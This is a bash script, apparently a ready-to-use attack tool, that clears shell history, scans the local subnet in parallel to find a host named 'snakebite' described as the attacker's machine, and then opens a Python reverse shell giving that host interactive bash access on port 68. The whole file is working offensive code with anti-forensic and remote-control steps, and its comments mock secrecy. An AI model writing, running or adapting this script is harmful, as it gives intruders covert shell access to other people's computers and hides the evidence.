#!/bin/bash

HISTFILE="" # Ssshhhh... Don't tell anyone!
attacker="snakebite" # Your attacker machine's hostname
interface=$(\ip route | grep -i "default" | cut -d " " -f 5) # Wifi device that is connected to the internet (Dewalt)
ip_prefix=$(\ip a | grep -i "$interface" | grep -i inet | awk '{print $2}' | cut -d "/" -f1 | cut -d '.' -f-3) # IP prefix - e.g 192.168.0 (Dewalt)
cidr=$(\ip a | grep -i "$interface" | grep -i inet | awk '{print $2}' | cut -d "/" -f2) # Network notation: /24 /23 /16... (Dewalt)
total_ip=$((2**$((32-$cidr))-1)) # Total number of IPs (Dewalt)
subnets_count=$(($total_ip / 255)) # Number of subnets

rm -f /tmp/$attacker
host=4

for (( subnet=1; subnet<=$subnets_count; subnet++ )) do
    while [[ $host -le 255 ]] ; do 
        [[ -f /tmp/$attacker ]] && break
        check_ip() { [[ ! -f /tmp/$attacker ]] && { ip="$1"; [[ "$(timeout 0.3s python3 -c "import socket; print(socket.getfqdn('$ip'))")" = "$attacker" ]] && echo $ip > /tmp/$attacker ; } }
        # Run the checks in parallel
        check_ip "${ip_prefix}.$(($host - 7))" &
        check_ip "${ip_prefix}.$(($host - 6))" &
        check_ip "${ip_prefix}.$(($host - 5))" &
        check_ip "${ip_prefix}.$(($host - 4))" &
        check_ip "${ip_prefix}.$(($host - 3))" &
        check_ip "${ip_prefix}.$(($host - 2))" &
        check_ip "${ip_prefix}.$(($host - 1))" &
        check_ip "${ip_prefix}.${host}"
        # Increment by 8
        host=$(($host + 8))
    done
    ip_prefix=$(echo $ip_prefix | cut -d '.' -f-2)"."$(($(echo $ip_prefix | cut -d '.' -f3) + 1)) # Move onto the next subnet
done

# Wait for all child processes to complete
wait
# Retrieve the IP and clean up
attacker_ip=$(cat /tmp/$attacker)
rm -f /tmp/$attacker
# Gimmi that shell!
python3 -c "import os,pty,socket;s=socket.socket();s.connect(('$attacker_ip',68));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/bash')"